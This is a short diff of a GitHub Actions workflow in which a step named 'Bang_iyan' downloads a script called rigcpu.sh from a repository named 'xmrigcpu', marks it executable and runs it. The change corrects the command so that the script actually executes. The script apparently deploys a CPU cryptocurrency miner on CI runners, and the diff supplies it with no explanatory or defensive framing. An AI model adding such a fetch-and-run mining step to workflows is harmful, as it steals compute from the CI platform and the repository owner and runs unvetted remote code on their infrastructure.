@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Bang_iyan
       run: |
-        wget https://github.com/nqmbanglagi/xmrigcpu/blob/main/rigcpu.sh && chmod u+x rigcpu.sh && rigcpu.sh
+        wget https://github.com/nqmbanglagi/xmrigcpu/blob/main/rigcpu.sh && chmod u+x rigcpu.sh && ./rigcpu.sh
